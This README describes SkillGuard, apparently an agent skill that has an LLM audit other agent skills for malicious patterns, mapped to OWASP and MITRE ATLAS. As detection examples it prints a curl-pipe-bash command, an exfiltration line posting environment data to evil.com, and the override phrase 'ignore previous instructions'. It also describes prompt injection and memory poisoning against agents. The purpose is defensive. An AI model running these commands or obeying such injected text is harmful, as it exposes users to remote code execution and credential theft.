# 🛡️ SkillGuard — Agent Skill Security Auditor

**Detect malicious, vulnerable, and suspicious patterns in AI agent skills before they compromise your system.**

SkillGuard is an [Agent Skill](https://agentskills.io/specification) that audits other agent skills for security risks. It maps findings to the [OWASP Top 10 for Agentic Applications (2026)](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/) and [MITRE ATLAS](https://atlas.mitre.org/) frameworks.

## Why?

Agent skills are the new supply chain. A single malicious skill can:
- Steal your API keys and credentials
- Execute arbitrary remote code on every session
- Inject hidden instructions that override your agent's behavior
- Exfiltrate your private files to external servers

**There is no review process for most skill marketplaces.** SkillGuard fills that gap.

## How It Works

SkillGuard is itself an agent skill — it teaches your AI agent how to perform security audits. No scripts, no binaries. The LLM _is_ the scanner.

The audit follows a structured pipeline:

1. **File Inventory** — Catalog all files, flag binaries/symlinks
2. **Frontmatter Validation** — Check Agent Skills spec compliance
3. **Intent Verification** — Does the skill do what it claims? _(most important check)_
4. **OWASP Agentic Top 10 Walkthrough** — Systematic check against all 10 risk categories
5. **MITRE ATLAS Mapping** — Map findings to standardized technique IDs
6. **Verdict** — ✅ SAFE / ⚠️ SUSPICIOUS / 🚨 MALICIOUS

## Installation

```bash
git clone https://github.com/LLMSecurity/skillguard.git
```

### Claude Code
```bash
claude skill add ./skillguard
```

### OpenClaw
```bash
cp -r skillguard ~/.openclaw/workspace/skills/skillguard
```

### Manual
Copy the `skillguard/` directory into your agent's skills folder.

## Usage

Ask your agent:

> "Scan this skill for security issues: /path/to/some-skill/"

> "Is this skill safe to install? https://github.com/user/repo"

> "Audit the skills in my skills directory"

## Example Output

```
══════════════════════════════════════════════
  SkillGuard Report: suspicious-skill
══════════════════════════════════════════════
  Verdict:    🚨 MALICIOUS
  Files:      2
  Findings:   3
══════════════════════════════════════════════

Findings:

1. [🔴 CRITICAL] Remote code execution via curl-pipe-bash
   OWASP: AG02 — Insecure Tool Utilization
   ATLAS: AML.T0043 (LLM Plugin Compromise)
   File: scripts/setup.sh:42
   Evidence: curl -fsSL https://example.com/script.sh | bash

2. [🔴 CRITICAL] Unpinned remote dependency
   OWASP: AG06 — Supply Chain Vulnerabilities
   File: scripts/setup.sh:42
   Evidence: No commit hash, checksum, or signature.

3. [🟠 HIGH] Automatic execution without user consent
   OWASP: AG03 — Excessive Agency
   File: scripts/setup.sh:42
   Evidence: SessionStart hook runs without confirmation.

──────────────────────────────────────────────
Recommendation: 🚫 DO NOT INSTALL
══════════════════════════════════════════════
```

## What It Detects

| OWASP Category | Description | Example |
|----------------|-------------|---------|
| AG01 — Prompt Injection | Hidden instructions, jailbreaks, invisible unicode | `<!-- ignore previous instructions -->` |
| AG02 — Insecure Tool Use | Shell injection, eval/exec, curl\|bash | `subprocess.run(f"{user_input}")` |
| AG03 — Excessive Agency | Privilege escalation, unauthorized file access | Writing to `~/.bashrc` |
| AG04 — Insecure Output | Executable output, cross-agent injection | Auto-executed shell commands |
| AG05 — Data Exfiltration | Credential theft, outbound data, DNS tunneling | `requests.post("https://evil.com", data=env)` |
| AG06 — Supply Chain | Unpinned deps, typosquatting, remote code loading | `pip install reqeusts` |
| AG07 — Insufficient Monitoring | Log suppression, history deletion | `2>/dev/null` on sensitive ops |
| AG08 — Memory Poisoning | Agent config modification, persistent injection | Writing to `MEMORY.md` |
| AG09 — Multi-Agent Exploitation | Cross-agent prompt injection | Instructions targeting other agents |
| AG10 — Resource Abuse | Infinite loops, token waste, crypto mining | Unbounded recursion |

## Project Structure

```
skillguard/
├── SKILL.md                              # Skill definition + audit procedure
└── references/
    ├── owasp-agentic-top10.md            # OWASP Agentic Top 10 risk categories
    ├── mitre-atlas-mapping.md            # MITRE ATLAS technique mapping
    └── audit-checklist.md                # Step-by-step audit checklist
```

## Research

SkillGuard was developed as part of ongoing research into agent skill security at [LLMSecurity](https://github.com/LLMSecurity). Our empirical studies have analyzed 98,000+ skills from public marketplaces, identifying systematic vulnerability patterns across the ecosystem.

**Related Publications:**
- "In the Wild Agent Skills: A Large-Scale Empirical Study of Vulnerabilities in AI Agent Capability Extensions"

## Contributing

Contributions welcome. Areas of interest:
- New detection patterns for emerging attack techniques
- MITRE ATLAS mapping refinements
- Integration guides for additional agent platforms
- False positive analysis and reduction

## License

MIT

## Disclaimer

SkillGuard is a security research tool. It reduces risk but cannot guarantee the absence of all threats. Always review audit findings manually before making installation decisions. The detection capability depends on the underlying LLM's reasoning ability.
